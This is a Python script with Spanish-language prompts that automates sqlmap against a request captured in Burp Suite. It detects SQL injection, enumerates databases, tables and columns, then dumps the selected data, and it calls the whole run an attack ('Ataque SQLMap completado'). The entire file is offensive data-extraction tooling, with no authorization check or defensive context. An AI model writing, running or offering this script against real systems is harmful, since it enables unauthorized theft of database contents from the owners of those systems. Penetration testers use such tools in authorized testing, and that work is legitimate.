#!/usr/bin/env python3
import subprocess as sp
import re
from pathlib import Path
import sys

# Paleta ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"

print(f"""{CYAN}
    ╔═══════════════════════════════╗
    ║   SQLMap Auto - Burp Suite    ║
    ║      Automated SQL Injection  ║
    ╚═══════════════════════════════╝
{RESET}""")

# Solicitar archivo de Burp Suite
print(f"{YELLOW}Ingresa la ruta del archivo .txt con la interceptación de Burp Suite{RESET}")
archivo_burp = input(">>> ").strip()

# Verificar que el archivo existe
archivo_path = Path(archivo_burp).expanduser()
if not archivo_path.exists():
    print(f"{RED}Error: El archivo no existe!{RESET}")
    sys.exit(1)

print(f"{GREEN}Archivo cargado correctamente: {archivo_path}{RESET}\n")

# Opciones adicionales
print(f"{YELLOW}¿Quieres usar opciones adicionales?{RESET}")
print(" [1] Detección básica (rápido)")
print(" [2] Detección completa (lento pero exhaustivo)")
print(" [3] Personalizado")
nivel_deteccion = input(">>> ").strip()

opciones_extra = []
if nivel_deteccion == "1":
    opciones_extra = ["--batch"]
elif nivel_deteccion == "2":
    opciones_extra = ["--batch", "--level=5", "--risk=3"]
elif nivel_deteccion == "3":
    print(f"{YELLOW}Nivel (1-5, default 1):{RESET}")
    nivel = input(">>> ").strip()
    print(f"{YELLOW}Riesgo (1-3, default 1):{RESET}")
    riesgo = input(">>> ").strip()
    
    opciones_extra = ["--batch"]
    if nivel:
        opciones_extra.append(f"--level={nivel}")
    if riesgo:
        opciones_extra.append(f"--risk={riesgo}")

# Función para ejecutar comandos SQLMap
def ejecutar_sqlmap(cmd, descripcion):
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}{descripcion}{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"{BLUE}Comando: {' '.join(cmd)}{RESET}\n")
    
    proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, text=True)
    output = []
    
    for line in proc.stdout:
        print(line, end="")
        output.append(line)
    
    proc.wait()
    return ''.join(output), proc.returncode

# Función para extraer bases de datos del output
def extraer_databases(output):
    databases = []
    # Buscar el patrón de bases de datos listadas
    in_db_section = False
    
    for line in output.split('\n'):
        # Detectar inicio de sección de bases de datos
        if 'available databases' in line.lower():
            in_db_section = True
            continue
        
        # Extraer nombres de bases de datos
        if in_db_section:
            # Patrón: [*] nombre_db
            match = re.match(r'\[\*\]\s+(.+)', line.strip())
            if match:
                databases.append(match.group(1).strip())
            # Salir si encontramos línea vacía o nueva sección
            elif line.strip() == '' or line.startswith('['):
                if databases:  # Solo salir si ya encontramos algunas
                    break
    
    return databases

# Función para extraer tablas del output
def extraer_tablas(output):
    tablas = []
    in_table_section = False
    
    for line in output.split('\n'):
        if 'database' in line.lower() and 'table' in line.lower():
            in_table_section = True
            continue
        
        if in_table_section:
            match = re.match(r'\[\*\]\s+(.+)', line.strip())
            if match:
                tablas.append(match.group(1).strip())
            elif line.strip() == '' or (line.startswith('[') and '[*]' not in line):
                if tablas:
                    break
    
    return tablas

# Función para extraer columnas del output
def extraer_columnas(output):
    columnas = []
    in_column_section = False
    
    for line in output.split('\n'):
        if 'column' in line.lower():
            in_column_section = True
            continue
        
        if in_column_section:
            match = re.match(r'\[\*\]\s+(.+)', line.strip())
            if match:
                columnas.append(match.group(1).strip())
            elif line.strip() == '' or (line.startswith('[') and '[*]' not in line):
                if columnas:
                    break
    
    return columnas

# Paso 1: Detectar vulnerabilidad y obtener bases de datos
print(f"\n{GREEN}{BOLD}>>> PASO 1: Detectando vulnerabilidad y enumerando bases de datos...{RESET}")
cmd_dbs = ["sqlmap", "-r", str(archivo_path), "--dbs"] + opciones_extra
output_dbs, retcode = ejecutar_sqlmap(cmd_dbs, "Enumerando bases de datos")

if retcode != 0:
    print(f"{RED}Error al ejecutar SQLMap{RESET}")
    sys.exit(1)

# Extraer bases de datos
databases = extraer_databases(output_dbs)

if not databases:
    print(f"{YELLOW}No se encontraron bases de datos o no hay vulnerabilidad SQL.{RESET}")
    print(f"{YELLOW}Revisa el output anterior para más detalles.{RESET}")
    sys.exit(0)

# Paso 2: Seleccionar base de datos
print(f"\n{GREEN}{BOLD}>>> Bases de datos encontradas:{RESET}")
for idx, db in enumerate(databases, 1):
    print(f"  [{idx}] {db}")

print(f"\n{YELLOW}Selecciona la base de datos a atacar (número):{RESET}")
seleccion_db = input(">>> ").strip()

try:
    db_index = int(seleccion_db) - 1
    database_seleccionada = databases[db_index]
    print(f"{GREEN}Has seleccionado: {BOLD}{database_seleccionada}{RESET}\n")
except (ValueError, IndexError):
    print(f"{RED}Selección inválida!{RESET}")
    sys.exit(1)

# Paso 3: Obtener tablas de la base de datos seleccionada
print(f"\n{GREEN}{BOLD}>>> PASO 2: Enumerando tablas de '{database_seleccionada}'...{RESET}")
cmd_tables = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, "--tables"] + opciones_extra
output_tables, retcode = ejecutar_sqlmap(cmd_tables, f"Tablas de {database_seleccionada}")

if retcode != 0:
    print(f"{RED}Error al obtener tablas{RESET}")
    sys.exit(1)

# Extraer tablas
tablas = extraer_tablas(output_tables)

if not tablas:
    print(f"{YELLOW}No se encontraron tablas en esta base de datos.{RESET}")
    sys.exit(0)

# Paso 4: Seleccionar tabla
print(f"\n{GREEN}{BOLD}>>> Tablas encontradas en '{database_seleccionada}':{RESET}")
for idx, tabla in enumerate(tablas, 1):
    print(f"  [{idx}] {tabla}")

print(f"\n{YELLOW}¿Quieres atacar una tabla específica o todas?{RESET}")
print("  [0] Dumpear TODAS las tablas")
print("  [1-N] Seleccionar una tabla específica")
seleccion_tabla = input(">>> ").strip()

# Paso 5: Dump de datos
if seleccion_tabla == "0":
    # Dumpear toda la base de datos
    print(f"\n{GREEN}{BOLD}>>> PASO 3: Dumpeando TODA la base de datos '{database_seleccionada}'...{RESET}")
    cmd_dump = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, "--dump"] + opciones_extra
    ejecutar_sqlmap(cmd_dump, f"Dump completo de {database_seleccionada}")
else:
    try:
        tabla_index = int(seleccion_tabla) - 1
        tabla_seleccionada = tablas[tabla_index]
        print(f"{GREEN}Has seleccionado: {BOLD}{tabla_seleccionada}{RESET}\n")
        
        # Preguntar si quiere ver columnas primero
        print(f"{YELLOW}¿Quieres ver las columnas de '{tabla_seleccionada}' antes de dumpear? (s/n){RESET}")
        ver_columnas = input(">>> ").strip().lower()
        
        if ver_columnas == 's':
            print(f"\n{GREEN}{BOLD}>>> Enumerando columnas de '{tabla_seleccionada}'...{RESET}")
            cmd_columns = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, "-T", tabla_seleccionada, "--columns"] + opciones_extra
            output_columns, retcode = ejecutar_sqlmap(cmd_columns, f"Columnas de {tabla_seleccionada}")
            
            columnas = extraer_columnas(output_columns)
            
            if columnas:
                print(f"\n{GREEN}{BOLD}>>> Columnas encontradas:{RESET}")
                for idx, col in enumerate(columnas, 1):
                    print(f"  [{idx}] {col}")
                
                print(f"\n{YELLOW}¿Quieres dumpear columnas específicas? (s/n){RESET}")
                dump_especifico = input(">>> ").strip().lower()
                
                if dump_especifico == 's':
                    print(f"{YELLOW}Ingresa los números de columnas separados por coma (ej: 1,3,5):{RESET}")
                    cols_seleccion = input(">>> ").strip()
                    
                    try:
                        indices = [int(x.strip()) - 1 for x in cols_seleccion.split(',')]
                        columnas_seleccionadas = [columnas[i] for i in indices]
                        
                        print(f"\n{GREEN}{BOLD}>>> PASO 3: Dumpeando columnas seleccionadas...{RESET}")
                        cmd_dump = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, 
                                   "-T", tabla_seleccionada, "-C", ','.join(columnas_seleccionadas), 
                                   "--dump"] + opciones_extra
                        ejecutar_sqlmap(cmd_dump, f"Dump de columnas específicas")
                    except (ValueError, IndexError):
                        print(f"{RED}Selección inválida, dumpeando toda la tabla...{RESET}")
                        cmd_dump = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, 
                                   "-T", tabla_seleccionada, "--dump"] + opciones_extra
                        ejecutar_sqlmap(cmd_dump, f"Dump de {tabla_seleccionada}")
                else:
                    cmd_dump = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, 
                               "-T", tabla_seleccionada, "--dump"] + opciones_extra
                    ejecutar_sqlmap(cmd_dump, f"Dump de {tabla_seleccionada}")
        else:
            print(f"\n{GREEN}{BOLD}>>> PASO 3: Dumpeando tabla '{tabla_seleccionada}'...{RESET}")
            cmd_dump = ["sqlmap", "-r", str(archivo_path), "-D", database_seleccionada, 
                       "-T", tabla_seleccionada, "--dump"] + opciones_extra
            ejecutar_sqlmap(cmd_dump, f"Dump de {tabla_seleccionada}")
            
    except (ValueError, IndexError):
        print(f"{RED}Selección inválida!{RESET}")
        sys.exit(1)

# Final
print(f"\n{GREEN}{BOLD}{'='*60}{RESET}")
print(f"{GREEN}{BOLD}>>> Ataque SQLMap completado!{RESET}")
print(f"{GREEN}{BOLD}{'='*60}{RESET}")
print(f"{YELLOW}Los resultados se han guardado en: ~/.sqlmap/output/{RESET}")